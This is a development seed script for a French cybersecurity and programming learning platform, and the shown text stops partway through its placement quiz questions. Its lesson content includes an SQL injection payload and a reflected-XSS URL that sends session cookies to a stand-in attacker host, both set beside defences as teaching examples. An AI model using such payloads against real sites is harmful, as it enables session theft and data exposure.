/**
 * Development seed - creates realistic but fake data for local development.
 * Run with: pnpm --filter @cyberlearn/db db:seed
 *
 * Creates:
 * - 1 admin user
 * - 2 student users
 * - 10 badges (2 per rarity)
 * - 5 lessons (mix of categories and difficulties)
 * - 2 paths
 * - 15 placement test questions (5 per category)
 */

import { PrismaClient } from "@prisma/client";

const prisma = new PrismaClient();

// ─── IDs (stable for reproducible dev seeding) ────────────────────────────

const ADMIN_ID = "00000000-0000-0000-0000-000000000001";
const STUDENT_1_ID = "00000000-0000-0000-0000-000000000002";
const STUDENT_2_ID = "00000000-0000-0000-0000-000000000003";

async function main() {
  console.log("🌱 Seeding database...");

  // ── Users ────────────────────────────────────────────────────────────────
  await prisma.user.upsert({
    where: { id: ADMIN_ID },
    create: {
      id: ADMIN_ID,
      email: "admin@cyberlearn.app",
      username: "admin",
      displayName: "Admin CyberLearn",
      role: "ADMIN",
    },
    update: {},
  });

  await prisma.user.upsert({
    where: { id: STUDENT_1_ID },
    create: {
      id: STUDENT_1_ID,
      email: "alice@example.com",
      username: "alice-dev",
      displayName: "Alice Dupont",
      role: "STUDENT",
      xpTotal: 350,
      level: 4,
    },
    update: {},
  });

  await prisma.user.upsert({
    where: { id: STUDENT_2_ID },
    create: {
      id: STUDENT_2_ID,
      email: "bob@example.com",
      username: "bob-sec",
      displayName: "Bob Martin",
      role: "STUDENT",
      xpTotal: 1200,
      level: 8,
    },
    update: {},
  });

  // ── User preferences ─────────────────────────────────────────────────────
  for (const userId of [ADMIN_ID, STUDENT_1_ID, STUDENT_2_ID]) {
    await prisma.userPreferences.upsert({
      where: { userId },
      create: { userId },
      update: {},
    });
  }

  console.log("✅ Users seeded");

  // ── Badges ───────────────────────────────────────────────────────────────
  const badges = [
    {
      refCode: "CL-BDG-001",
      name: "Premier pas",
      description: "Complétez votre première leçon.",
      iconUrl: "/badges/first-step.svg",
      rarity: "COMMON" as const,
      criterionType: "LESSON_COMPLETED" as const,
      criterionData: { count: 1 },
    },
    {
      refCode: "CL-BDG-002",
      name: "Curieux",
      description: "Complétez 5 leçons.",
      iconUrl: "/badges/curious.svg",
      rarity: "COMMON" as const,
      criterionType: "LESSON_COMPLETED" as const,
      criterionData: { count: 5 },
    },
    {
      refCode: "CL-BDG-003",
      name: "Explorateur",
      description: "Complétez votre première leçon dans chaque catégorie.",
      iconUrl: "/badges/explorer.svg",
      rarity: "RARE" as const,
      criterionType: "CATEGORY_MASTERY" as const,
      criterionData: { categories: ["DEV", "CYBERSEC", "NETWORK"] },
    },
    {
      refCode: "CL-BDG-004",
      name: "Sérieux",
      description: "Maintenez un streak de 7 jours.",
      iconUrl: "/badges/streak-7.svg",
      rarity: "RARE" as const,
      criterionType: "STREAK_DAYS" as const,
      criterionData: { days: 7 },
    },
    {
      refCode: "CL-BDG-005",
      name: "Hacktiviste",
      description: "Atteignez 1000 XP.",
      iconUrl: "/badges/xp-1000.svg",
      rarity: "EPIC" as const,
      criterionType: "XP_THRESHOLD" as const,
      criterionData: { threshold: 1000 },
    },
    {
      refCode: "CL-BDG-006",
      name: "Quiz parfait",
      description: "Obtenez 100% à un quiz.",
      iconUrl: "/badges/perfect-quiz.svg",
      rarity: "EPIC" as const,
      criterionType: "PERFECT_QUIZ" as const,
      criterionData: {},
    },
    {
      refCode: "CL-BDG-007",
      name: "Quick Start",
      description: "Prouvez vos connaissances au test de placement.",
      iconUrl: "/badges/quick-start.svg",
      rarity: "RARE" as const,
      criterionType: "CUSTOM" as const,
      criterionData: { event: "placement_test_passed" },
    },
    {
      refCode: "CL-BDG-008",
      name: "Architecte",
      description: "Complétez un parcours entier.",
      iconUrl: "/badges/architect.svg",
      rarity: "EPIC" as const,
      criterionType: "PATH_COMPLETED" as const,
      criterionData: { count: 1 },
    },
    {
      refCode: "CL-BDG-009",
      name: "Légende",
      description: "Atteignez le niveau 50.",
      iconUrl: "/badges/legend.svg",
      rarity: "LEGENDARY" as const,
      criterionType: "XP_THRESHOLD" as const,
      // cumulativeXpForLevel(50) = 50 * 50 * 49 = 122 500
      criterionData: { threshold: 122500 },
    },
    {
      refCode: "CL-BDG-010",
      name: "Certifié",
      description: "Obtenez votre premier certificat.",
      iconUrl: "/badges/certified.svg",
      rarity: "LEGENDARY" as const,
      criterionType: "PATH_COMPLETED" as const,
      criterionData: { withCertificate: true },
    },
  ];

  for (const badge of badges) {
    await prisma.badge.upsert({
      where: { refCode: badge.refCode },
      create: badge,
      update: { criterionType: badge.criterionType, criterionData: badge.criterionData },
    });
  }

  console.log("✅ Badges seeded");

  // ── Lessons ──────────────────────────────────────────────────────────────
  const lessons = [
    {
      refCode: "CL-LSN-001-V01",
      slug: "intro-sql-injection",
      title: "Introduction aux injections SQL",
      description:
        "Comprenez comment fonctionne une injection SQL et comment s'en protéger avec des requêtes paramétrées.",
      category: "CYBERSEC" as const,
      difficulty: "BEGINNER" as const,
      estimatedMinutes: 30,
      xpReward: 100,
      contentMdx: `# Introduction aux injections SQL

Une injection SQL est l'une des vulnérabilités web les plus répandues et les plus dangereuses. Elle figure régulièrement dans le top 3 de l'OWASP Top 10.

## Qu'est-ce qu'une injection SQL ?

Une injection SQL (SQLi) survient lorsqu'un attaquant insère du code SQL malveillant dans une requête. Si l'application ne valide pas ses entrées, la base de données exécutera le code injecté.

## Exemple concret

Voici du code PHP **vulnérable** :

\`\`\`php
$query = "SELECT * FROM users WHERE email = '" . $_GET['email'] . "'";
\`\`\`

Si l'attaquant soumet \`' OR '1'='1\`, la requête devient :

\`\`\`sql
SELECT * FROM users WHERE email = '' OR '1'='1'
\`\`\`

Comme \`'1'='1'\` est toujours vrai, **tous** les utilisateurs sont retournés.

## La solution : les requêtes paramétrées

\`\`\`php
$stmt = $pdo->prepare("SELECT * FROM users WHERE email = ?");
$stmt->execute([$_GET['email']]);
\`\`\`

Les données utilisateur ne sont jamais interprétées comme du code SQL.

## Types d'injections SQL

- **In-band SQLi** - le résultat est renvoyé directement dans la réponse HTTP
- **Blind SQLi** - pas de retour direct ; l'attaquant observe les temps de réponse ou les erreurs
- **Out-of-band SQLi** - extraction via un canal secondaire (DNS, HTTP sortant)

## Bonnes pratiques

1. Utiliser des requêtes paramétrées **systématiquement**
2. Appliquer le principe du moindre privilège sur les comptes de base de données
3. Ne jamais afficher les erreurs SQL en production
4. Activer les logs de la base de données pour détecter les tentatives

> **À retenir :** les requêtes paramétrées séparent structurellement le code SQL des données. C'est la seule protection réellement fiable.`,
      authorId: ADMIN_ID,
      status: "PUBLISHED" as const,
      publishedAt: new Date(),
    },
    {
      refCode: "CL-LSN-002-V01",
      slug: "xss-cross-site-scripting",
      title: "Cross-Site Scripting (XSS)",
      description:
        "Découvrez les attaques XSS réfléchies et stockées, et les techniques de défense.",
      category: "CYBERSEC" as const,
      difficulty: "INTERMEDIATE" as const,
      estimatedMinutes: 45,
      xpReward: 150,
      contentMdx: `# Cross-Site Scripting (XSS)

Le XSS permet à un attaquant d'injecter du JavaScript malveillant dans une page web, qui s'exécute dans le navigateur de la victime.

## Types de XSS

### XSS Réfléchi (Reflected)

L'injection n'est pas stockée. Elle transite dans une URL et s'exécute immédiatement :

\`\`\`
https://example.com/search?q=<script>document.location='https://attacker.com/steal?c='+document.cookie</script>
\`\`\`

### XSS Stocké (Stored / Persistent)

L'injection est sauvegardée en base de données (commentaire, profil…) et s'exécute pour **chaque visiteur** de la page.

### XSS basé sur le DOM

L'injection modifie le DOM côté client sans passer par le serveur.

## Impact

Un XSS peut permettre de :
- **Voler des cookies de session** → usurpation d'identité
- **Keylogging** → capture des frappes clavier
- **Redirection** → phishing
- **Défacement** → modification visuelle de la page

## Protections

\`\`\`html
<!-- Mauvais : injection directe de données non filtrées -->
<p>Bienvenue <?= $_GET['name'] ?></p>

<!-- Bon : encodage HTML -->
<p>Bienvenue <?= htmlspecialchars($_GET['name'], ENT_QUOTES, 'UTF-8') ?></p>
\`\`\`

En React / Next.js, JSX encode automatiquement les variables - la protection est intégrée :

\`\`\`tsx
// Sûr : React encode le HTML automatiquement
<p>Bienvenue {name}</p>
\`\`\`

## Content Security Policy (CSP)

Le header CSP limite les sources de scripts autorisées :

\`\`\`
Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.example.com
\`\`\`

> **À retenir :** toujours encoder les sorties et définir une CSP stricte.`,
      authorId: ADMIN_ID,
      status: "PUBLISHED" as const,
      publishedAt: new Date(),
    },
    {
      refCode: "CL-LSN-003-V01",
      slug: "typescript-generics",
      title: "TypeScript : les génériques",
      description:
        "Maîtrisez les types génériques en TypeScript pour écrire du code réutilisable et type-safe.",
      category: "DEV" as const,
      difficulty: "INTERMEDIATE" as const,
      estimatedMinutes: 40,
      xpReward: 120,
      contentMdx: `# TypeScript : les génériques

Les génériques permettent d'écrire des fonctions, classes et interfaces qui fonctionnent avec **n'importe quel type** tout en restant type-safe.

## Problème sans génériques

\`\`\`typescript
// Trop restrictif : ne fonctionne qu'avec des nombres
function identity(value: number): number {
  return value;
}

// Trop permissif : perd l'information de type
function identity(value: unknown): unknown {
  return value;
}
\`\`\`

## La solution : les génériques

\`\`\`typescript
function identity<T>(value: T): T {
  return value;
}

const num = identity(42);        // T = number
const str = identity("bonjour"); // T = string
\`\`\`

## Contraintes sur les génériques

Vous pouvez restreindre T avec \`extends\` :

\`\`\`typescript
function getLength<T extends { length: number }>(value: T): number {
  return value.length;
}

getLength("bonjour"); // ✓
getLength([1, 2, 3]); // ✓
getLength(42);        // ✗ Error: number n'a pas de propriété length
\`\`\`

## Interfaces génériques

\`\`\`typescript
interface ApiResponse<T> {
  data: T;
  status: number;
  message: string;
}

type UserResponse = ApiResponse<User>;
type LessonResponse = ApiResponse<Lesson[]>;
\`\`\`

## Génériques avec plusieurs paramètres

\`\`\`typescript
function merge<T, U>(obj1: T, obj2: U): T & U {
  return { ...obj1, ...obj2 };
}

const result = merge({ name: "Alice" }, { age: 30 });
// result: { name: string; age: number }
\`\`\`

## Cas d'usage réels

\`\`\`typescript
// useState en React est générique
const [user, setUser] = useState<User | null>(null);

// Fetch type-safe
async function fetchData<T>(url: string): Promise<T> {
  const res = await fetch(url);
  return res.json() as Promise<T>;
}

const user = await fetchData<User>("/api/me");
\`\`\`

> **À retenir :** les génériques offrent la réutilisabilité du code \`any\` avec la sûreté du code typé fortement.`,
      authorId: ADMIN_ID,
      status: "PUBLISHED" as const,
      publishedAt: new Date(),
    },
    {
      refCode: "CL-LSN-004-V01",
      slug: "modele-osi",
      title: "Le modèle OSI expliqué",
      description:
        "Comprenez les 7 couches du modèle OSI et leur rôle dans la communication réseau.",
      category: "NETWORK" as const,
      difficulty: "BEGINNER" as const,
      estimatedMinutes: 25,
      xpReward: 80,
      contentMdx: `# Le modèle OSI

Le modèle OSI (Open Systems Interconnection) est un cadre conceptuel qui divise les communications réseau en **7 couches** indépendantes.

## Les 7 couches

| Couche | Nom | Rôle |
|--------|-----|------|
| 7 | Application | Protocoles HTTP, DNS, SMTP, FTP |
| 6 | Présentation | Encodage, chiffrement, compression |
| 5 | Session | Gestion des sessions de communication |
| 4 | Transport | TCP / UDP - fiabilité et ports |
| 3 | Réseau | Routage IP, adressage logique |
| 2 | Liaison | MAC, commutateurs, trames |
| 1 | Physique | Câbles, signaux électriques/optiques |

## Pourquoi 7 couches ?

Chaque couche a une **responsabilité unique** et communique uniquement avec les couches adjacentes. Cela permet :
- De remplacer une technologie sans toucher les autres couches
- D'isoler les problèmes lors du débogage réseau
- D'interopérabilité entre équipements de constructeurs différents

## Couches clés à retenir

### Couche 3 - Réseau

C'est ici que se fait le routage entre réseaux. Le protocole IP opère à ce niveau. Un **routeur** traite les paquets couche 3.

### Couche 4 - Transport

- **TCP** : connexion établie, livraison garantie et ordonnée (HTTP, SSH)
- **UDP** : sans connexion, rapide, sans garantie (DNS, streaming, jeux)

Les **ports** (80, 443, 22…) appartiennent à la couche 4.

### Couche 7 - Application

Protocoles directement utilisés par les applications :
- **HTTP/HTTPS** : navigation web
- **DNS** : résolution de noms
- **SMTP/IMAP** : email

## Mnémotechnique

De bas en haut : **P**hysique, **L**iaison, **R**éseau, **T**ransport, **S**ession, **P**résentation, **A**pplication

> _"Please Do Not Throw Sausage Pizza Away"_

> **À retenir :** identifier la couche OSI d'un problème réseau est la première étape du diagnostic.`,
      authorId: ADMIN_ID,
      status: "PUBLISHED" as const,
      publishedAt: new Date(),
    },
    {
      refCode: "CL-LSN-005-V01",
      slug: "http-https-fondamentaux",
      title: "HTTP/HTTPS : les fondamentaux",
      description:
        "Comprenez comment fonctionnent HTTP et HTTPS, les méthodes, les codes de statut et les headers.",
      category: "NETWORK" as const,
      difficulty: "BEGINNER" as const,
      estimatedMinutes: 30,
      xpReward: 90,
      contentMdx: `# HTTP/HTTPS : les fondamentaux

HTTP (HyperText Transfer Protocol) est le protocole de communication fondamental du web. Il fonctionne en mode **requête / réponse** entre un client (navigateur) et un serveur.

## Méthodes HTTP

| Méthode | Usage | Idempotent |
|---------|-------|-----------|
| GET | Lire une ressource | ✓ |
| POST | Créer une ressource | ✗ |
| PUT | Remplacer une ressource | ✓ |
| PATCH | Modifier partiellement | ✗ |
| DELETE | Supprimer une ressource | ✓ |

## Codes de statut

\`\`\`
2xx  Succès
  200 OK
  201 Created
  204 No Content

3xx  Redirection
  301 Moved Permanently
  302 Found (temporaire)
  304 Not Modified

4xx  Erreur client
  400 Bad Request
  401 Unauthorized
  403 Forbidden
  404 Not Found
  429 Too Many Requests

5xx  Erreur serveur
  500 Internal Server Error
  502 Bad Gateway
  503 Service Unavailable
\`\`\`

## Headers importants

\`\`\`http
GET /api/user HTTP/1.1
Host: api.example.com
Authorization: Bearer eyJhbGci...
Content-Type: application/json
Accept: application/json
\`\`\`

## HTTP vs HTTPS

| | HTTP | HTTPS |
|-|------|-------|
| Port | 80 | 443 |
| Chiffrement | Aucun | TLS/SSL |
| Certificat | Non | Oui (CA) |
| Usage | Obsolète | Standard |

HTTPS = HTTP + **TLS (Transport Layer Security)**

Le chiffrement TLS garantit :
1. **Confidentialité** - les données ne peuvent pas être lues par un tiers
2. **Intégrité** - les données ne peuvent pas être modifiées en transit
3. **Authentification** - le serveur est bien celui qu'il prétend être

## Headers de sécurité essentiels

\`\`\`http
Strict-Transport-Security: max-age=31536000; includeSubDomains
Content-Security-Policy: default-src 'self'
X-Frame-Options: DENY
X-Content-Type-Options: nosniff
\`\`\`

> **À retenir :** HTTPS est obligatoire en production. HTTP expose les données en clair sur le réseau.`,
      authorId: ADMIN_ID,
      status: "PUBLISHED" as const,
      publishedAt: new Date(),
    },
    // 6th PUBLISHED lesson
    {
      refCode: "CL-LSN-006-V01",
      slug: "git-github-introduction",
      title: "Introduction à Git & GitHub",
      description:
        "Maîtrisez les bases de Git pour versionner votre code et collaborer efficacement avec GitHub.",
      category: "DEV" as const,
      difficulty: "BEGINNER" as const,
      estimatedMinutes: 35,
      xpReward: 90,
      contentMdx: `# Introduction à Git & GitHub

Git est un système de **contrôle de version distribué** créé par Linus Torvalds en 2005. GitHub est une plateforme hébergeant des dépôts Git et ajoutant des outils de collaboration.

## Concepts clés

- **Dépôt (repository)** - répertoire versionné contenant l'historique complet du projet
- **Commit** - instantané de l'état du projet à un moment donné
- **Branche** - ligne de développement indépendante
- **Merge** - fusion de deux branches

## Commandes essentielles

\`\`\`bash
# Initialiser un dépôt
git init

# Cloner un dépôt existant
git clone https://github.com/user/repo.git

# Voir le statut des fichiers
git status

# Ajouter des fichiers au staging
git add fichier.ts
git add .            # Tout ajouter

# Créer un commit
git commit -m "feat: ajouter la page de connexion"

# Voir l'historique
git log --oneline
\`\`\`

## Travailler avec les branches

\`\`\`bash
# Créer et basculer sur une branche
git checkout -b feat/nouvelle-fonctionnalite

# Lister les branches
git branch

# Fusionner une branche dans main
git checkout main
git merge feat/nouvelle-fonctionnalite

# Supprimer une branche fusionnée
git branch -d feat/nouvelle-fonctionnalite
\`\`\`

## Workflow avec GitHub

\`\`\`bash
# Envoyer vos commits vers GitHub
git push origin feat/ma-feature

# Récupérer les changements distants
git pull

# Associer un dépôt distant
git remote add origin https://github.com/user/repo.git
\`\`\`

## Conventions de messages de commit

Un bon message de commit suit le format **Conventional Commits** :

\`\`\`
<type>(<scope>): <description>

feat(auth): ajouter la connexion OAuth GitHub
fix(api): corriger la pagination des leçons
docs(readme): mettre à jour les instructions d'installation
refactor(db): extraire la logique de connexion
\`\`\`

Types courants : \`feat\`, \`fix\`, \`docs\`, \`refactor\`, \`test\`, \`chore\`

## .gitignore

Le fichier \`.gitignore\` liste les fichiers à ne **pas** versionner :

\`\`\`gitignore
# Dépendances
node_modules/

# Builds
.next/
dist/

# Variables d'environnement
.env
.env.local

# IDE
.vscode/
.idea/
\`\`\`

> **À retenir :** commitez souvent, avec des messages descriptifs. Ne commitez jamais \`.env\` ni \`node_modules\`.`,
      authorId: ADMIN_ID,
      status: "PUBLISHED" as const,
      publishedAt: new Date(),
    },
    // DRAFT lessons
    {
      refCode: "CL-LSN-007-V01",
      slug: "attaques-force-brute",
      title: "Attaques par force brute",
      description:
        "Comprenez le fonctionnement des attaques par force brute et comment protéger vos systèmes.",
      category: "CYBERSEC" as const,
      difficulty: "INTERMEDIATE" as const,
      estimatedMinutes: 35,
      xpReward: 130,
      contentMdx: `# Attaques par force brute

> **Leçon en cours de rédaction** - disponible prochainement.`,
      authorId: ADMIN_ID,
      status: "DRAFT" as const,
    },
    {
      refCode: "CL-LSN-008-V01",
      slug: "tcp-ip-en-profondeur",
      title: "TCP/IP en profondeur",
      description:
        "Explorez la suite de protocoles TCP/IP et son rôle dans les communications Internet.",
      category: "NETWORK" as const,
      difficulty: "INTERMEDIATE" as const,
      estimatedMinutes: 50,
      xpReward: 140,
      contentMdx: `# TCP/IP en profondeur

> **Leçon en cours de rédaction** - disponible prochainement.`,
      authorId: ADMIN_ID,
      status: "DRAFT" as const,
    },
    // Phase 4 demo - interactive components (Quiz + CodePlayground + Terminal)
    {
      refCode: "CL-LSN-009-V01",
      slug: "python-interactif-demo",
      title: "Python interactif : variables et types",
      description:
        "Découvrez les types de base en Python avec des exercices interactifs directement dans le navigateur.",
      category: "DEV" as const,
      difficulty: "BEGINNER" as const,
      estimatedMinutes: 20,
      xpReward: 80,
      contentMdx: `# Python interactif : variables et types

Python est un langage à typage dynamique. Chaque valeur a un type, mais tu n'as pas à le déclarer.

## Les types de base

| Type | Exemple | Description |
|------|---------|-------------|
| \`int\` | \`42\` | Entier |
| \`float\` | \`3.14\` | Décimal |
| \`str\` | \`"hello"\` | Chaîne de caractères |
| \`bool\` | \`True\` | Booléen |

## Essaye par toi-même

Lance ce code et observe la sortie :

<CodePlayground language="python" title="types.py">
{\`x = 42
y = 3.14
nom = "CyberLearn"
actif = True

print(f"x est de type {type(x).__name__}")
print(f"y est de type {type(y).__name__}")
print(f"nom est de type {type(nom).__name__}")
print(f"actif est de type {type(actif).__name__}")\`}
</CodePlayground>

## Exercice : affiche "Bonjour, monde !"

Modifie le code ci-dessous pour afficher exactement \`Bonjour, monde !\` :

<CodePlayground id="ex-hello" language="python" title="hello.py" expectedOutput="Bonjour, monde !" validate>
{\`# Modifie cette ligne
print("Hello, World!")\`}
</CodePlayground>

## Quiz de vérification

<Quiz
  id="quiz-types-1"
  question="Quel type Python utilises-tu pour stocker le nombre 3.14 ?"
  choices={["int", "float", "str", "bool"]}
  correct={1}
/>

## Terminal Linux

Explore les commandes de base dans ce terminal simulé :

<SimulatedTerminal scenario="linux-basics" title="bash" />
`,
      authorId: ADMIN_ID,
      status: "PUBLISHED" as const,
      publishedAt: new Date(),
    },
    // C sandbox - minimal interactive C lesson (validates cpp-runner.js worker)
    {
      refCode: "CL-LSN-010-V01",
      slug: "c-hello-world",
      title: "C : Hello World et arithmétique",
      description: "Premier programme en C : afficher du texte et effectuer un calcul simple.",
      category: "DEV" as const,
      difficulty: "BEGINNER" as const,
      estimatedMinutes: 5,
      xpReward: 10,
      contentMdx: `# C : Hello World

Ton premier programme en C utilise printf pour afficher du texte, et
une multiplication simple pour montrer l'arithmétique de base.

Lance le code et observe la sortie :

<CodePlayground language="c" title="hello.c">
{\`#include <stdio.h>

int main() {
    printf("Hello from C!\\n");
    int x = 6;
    int y = 7;
    printf("6 * 7 = %d\\n", x * y);
    return 0;
}\`}
</CodePlayground>
`,
      authorId: ADMIN_ID,
      status: "PUBLISHED" as const,
      publishedAt: new Date(),
    },
  ];

  const createdLessons: Record<string, string> = {};

  for (const lesson of lessons) {
    const created = await prisma.lesson.upsert({
      where: { refCode: lesson.refCode },
      create: lesson,
      update: {},
    });
    createdLessons[lesson.refCode] = created.id;
  }

  console.log("✅ Lessons seeded");

  // ── Paths ────────────────────────────────────────────────────────────────
  const pathCybersec = await prisma.path.upsert({
    where: { refCode: "CL-PATH-001-V01" },
    create: {
      refCode: "CL-PATH-001-V01",
      slug: "cybersecurite-debutant",
      title: "Cybersécurité - Niveau débutant",
      description:
        "Découvrez les bases de la cybersécurité : injections SQL, XSS, et les principes fondamentaux de la sécurité applicative.",
      category: "CYBERSEC",
      difficulty: "BEGINNER",
      estimatedHours: 3,
      status: "PUBLISHED",
      publishedAt: new Date(),
    },
    update: {},
  });

  const pathNetwork = await prisma.path.upsert({
    where: { refCode: "CL-PATH-002-V01" },
    create: {
      refCode: "CL-PATH-002-V01",
      slug: "reseaux-fondamentaux",
      title: "Réseaux - Les fondamentaux",
      description:
        "Maîtrisez les bases des réseaux informatiques : modèle OSI, protocoles TCP/IP, HTTP/HTTPS.",
      category: "NETWORK",
      difficulty: "BEGINNER",
      estimatedHours: 2,
      status: "PUBLISHED",
      publishedAt: new Date(),
    },
    update: {},
  });

  // Add lessons to paths
  const cybersecLessons = [
    { refCode: "CL-LSN-001-V01", position: 1 },
    { refCode: "CL-LSN-002-V01", position: 2 },
  ];

  for (const { refCode, position } of cybersecLessons) {
    const lessonId = createdLessons[refCode];
    if (lessonId) {
      await prisma.pathLesson.upsert({
        where: { pathId_lessonId: { pathId: pathCybersec.id, lessonId } },
        create: { pathId: pathCybersec.id, lessonId, position },
        update: { position },
      });
    }
  }

  const networkLessons = [
    { refCode: "CL-LSN-004-V01", position: 1 },
    { refCode: "CL-LSN-005-V01", position: 2 },
  ];

  for (const { refCode, position } of networkLessons) {
    const lessonId = createdLessons[refCode];
    if (lessonId) {
      await prisma.pathLesson.upsert({
        where: { pathId_lessonId: { pathId: pathNetwork.id, lessonId } },
        create: { pathId: pathNetwork.id, lessonId, position },
        update: { position },
      });
    }
  }

  console.log("✅ Paths seeded");

  // ── Placement questions ───────────────────────────────────────────────────
  const placementQuestions = [
    // DEV - Beginner
    {
      category: "DEV" as const,
      difficulty: "BEGINNER" as const,
      question: "Quelle est la différence entre `let` et `const` en JavaScript ?",
      options: [
        { id: "a", text: "`let` peut être réassigné, `const` ne peut pas" },
        { id: "b", text: "`const` peut être réassigné, `let` ne peut pas" },
        { id: "c", text: "Il n'y a aucune différence" },
        { id: "d", text: "`let` est pour les fonctions, `const` pour les classes" },
      ],
      correctOptionId: "a",
      explanation:
        "`let` déclare une variable réassignable. `const` déclare une liaison constante (la valeur peut être mutée si c'est un objet, mais la variable ne peut pas être réassignée).",
      orderIndex: 1,
    },
    // DEV - Intermediate
    {
      category: "DEV" as const,
      difficulty: "INTERMEDIATE" as const,
      question: "Qu'est-ce que la programmation fonctionnelle ?",
      options: [
        { id: "a", text: "Un paradigme basé sur les effets de bord" },
        {
          id: "b",
          text: "Un paradigme traitant le calcul comme l'évaluation de fonctions mathématiques pures, évitant l'état mutable",
        },
        { id: "c", text: "Un paradigme qui utilise uniquement des fonctions fléchées" },
        { id: "d", text: "Un style qui évite les classes au profit des fonctions" },
      ],
      correctOptionId: "b",
      explanation:
        "La programmation fonctionnelle est un paradigme qui traite le calcul comme l'évaluation de fonctions mathématiques pures, sans état mutable ni effets de bord.",
      orderIndex: 2,
    },
    // DEV - Intermediate
    {
      category: "DEV" as const,
      difficulty: "INTERMEDIATE" as const,
      question: "Que fait le mot-clé `async/await` en JavaScript ?",
      options: [
        { id: "a", text: "Rend le code synchrone" },
        { id: "b", text: "Simplifie l'écriture de code asynchrone basé sur les Promises" },
        { id: "c", text: "Crée plusieurs threads d'exécution" },
        { id: "d", text: "Empêche les callbacks" },
      ],
      correctOptionId: "b",
      explanation:
        "`async/await` est du sucre syntaxique sur les Promises, qui permet d'écrire du code asynchrone de façon synchrone et lisible.",
      orderIndex: 3,
    },
    // DEV - Advanced
    {
      category: "DEV" as const,
      difficulty: "ADVANCED" as const,
      question: "Qu'est-ce que le principe SOLID 'D' (Dependency Inversion) ?",
      options: [
        { id: "a", text: "Les modules de haut niveau dépendent de modules de bas niveau" },
        { id: "b", text: "Les modules de haut et bas niveau dépendent tous deux d'abstractions" },
        {
          id: "c",
          text: "Les dépendances doivent être injectées via des constructeurs uniquement",
        },
        { id: "d", text: "Les interfaces ne peuvent pas dépendre de classes concrètes" },
      ],
      correctOptionId: "b",
      explanation:
        "Le principe D de SOLID stipule que les modules de haut niveau et de bas niveau doivent tous dépendre d'abstractions (interfaces), et non l'un de l'autre directement.",
      orderIndex: 4,
    },
    // DEV - Advanced
    {
      category: "DEV" as const,
      difficulty: "ADVANCED" as const,
      question:
        "Quelle est la complexité temporelle de la recherche dans une HashMap bien conçue ?",
      options: [
        { id: "a", text: "O(n)" },
        { id: "b", text: "O(log n)" },
        { id: "c", text: "O(1) en moyenne" },
        { id: "d", text: "O(n²)" },
      ],
      correctOptionId: "c",
      explanation:
        "Une HashMap utilise une fonction de hachage pour calculer l'index directement, ce qui donne O(1) en moyenne pour les opérations de lecture/écriture/suppression.",
      orderIndex: 5,
    },
    // CYBERSEC - Beginner
    {
      category: "CYBERSEC" as const,
      difficulty: "BEGINNER" as const,
      question: "Quelle est la première règle pour prévenir les injections SQL ?",
      options: [
        { id: "a", text: "Utiliser des requêtes paramétrées (prepared statements)" },
        { id: "b", text: "Échapper les guillemets simples manuellement" },
        { id: "c", text: "Filtrer les mots-clés SQL dans les entrées utilisateur" },
        { id: "d", text: "Utiliser uniquement des procédures stockées" },
      ],
      correctOptionId: "a",
      explanation:
        "Les requêtes paramétrées séparent le code SQL des données, empêchant structurellement toute injection. Les autres approches sont des mitigations imparfaites.",
      orderIndex: 1,
    },
    // CYBERSEC - Beginner
    {
      category: "CYBERSEC" as const,
      difficulty: "BEGINNER" as const,
      question: "Qu'est-ce que le principe du moindre privilège ?",
      options: [
        { id: "a", text: "Utiliser le compte root uniquement quand nécessaire" },
        {
          id: "b",
          text: "Donner à chaque entité uniquement les droits minimum nécessaires à sa fonction",
        },
        { id: "c", text: "Réduire le nombre d'utilisateurs administrateurs" },
        { id: "d", text: "Utiliser des mots de passe complexes" },
      ],
      correctOptionId: "b",
      explanation:
        "Le moindre privilège signifie que chaque utilisateur, processus ou composant ne doit disposer que des droits strictement nécessaires à sa tâche, réduisant la surface d'attaque.",
      orderIndex: 2,
    },
    // CYBERSEC - Intermediate
    {
      category: "CYBERSEC" as const,
      difficulty: "INTERMEDIATE" as const,
      question: "Qu'est-ce que le CSP (Content Security Policy) ?",
      options: [
        { id: "a", text: "Un firewall applicatif côté serveur" },
        {
          id: "b",
          text: "Un header HTTP permettant de déclarer les sources de contenu autorisées, réduisant les risques de XSS",
        },
        { id: "c", text: "Un protocole de chiffrement des cookies" },
        { id: "d", text: "Un mécanisme d'authentification à deux facteurs" },
      ],
      correctOptionId: "b",
      explanation:
        "Le CSP est un header HTTP qui indique au navigateur les sources de scripts, styles, et autres ressources qu'il peut charger, réduisant significativement les attaques XSS.",
      orderIndex: 3,
    },
    // CYBERSEC - Intermediate
    {
      category: "CYBERSEC" as const,
      difficulty: "INTERMEDIATE" as const,
      question: "Quelle attaque consiste à voler un cookie de session en injectant du JavaScript ?",
      options: [
        { id: "a", text: "CSRF (Cross-Site Request Forgery)" },
        { id: "b", text: "SQL Injection" },
        { id: "c", text: "XSS (Cross-Site Scripting)" },
        { id: "d", text: "SSRF (Server-Side Request Forgery)" },
      ],
      correctOptionId: "c",
      explanation:
        "Le XSS permet d'injecter du JavaScript malveillant dans une page, qui s'exécute dans le navigateur de la victime et peut voler des cookies, tokens, etc.",
      orderIndex: 4,
    },
    // CYBERSEC - Advanced
    {
      category: "CYBERSEC" as const,
      difficulty: "ADVANCED" as const,
      question: "Qu'est-ce qu'une attaque SSRF (Server-Side Request Forgery) ?",
      options: [
        {
          id: "a",
          text: "Le serveur est forcé à faire des requêtes vers des ressources internes à partir d'une entrée utilisateur",
        },
        { id: "b", text: "Un attaquant forge la session d'un utilisateur côté serveur" },
        { id: "c", text: "Le serveur renvoie de fausses réponses HTTP" },
        { id: "d", text: "Une attaque par déni de service utilisant des requêtes malformées" },
      ],
      correctOptionId: "a",
      explanation:
        "SSRF force le serveur à émettre des requêtes HTTP vers des ressources internes (métadonnées cloud, services internes) ou externes non autorisées, à partir d'une URL contrôlée par l'attaquant.",
      orderIndex: 5,
    },
    // NETWORK - Beginner
    {
      category: "NETWORK" as const,
      difficulty: "BEGINNER" as const,
      question: "Combien de couches le modèle OSI contient-il ?",
      options: [
        { id: "a", text: "4" },
        { id: "b", text: "5" },
        { id: "c", text: "7" },
        { id: "d", text: "9" },
      ],
      correctOptionId: "c",
      explanation:
        "Le modèle OSI (Open Systems Interconnection) comporte 7 couches : Physique, Liaison, Réseau, Transport, Session, Présentation, Application.",
      orderIndex: 1,
    },
    // NETWORK - Beginner
    {
      category: "NETWORK" as const,
      difficulty: "BEGINNER" as const,
      question: "Quelle est la différence entre TCP et UDP ?",
      options: [
        { id: "a", text: "TCP est plus rapide, UDP est plus fiable" },
        {
          id: "b",
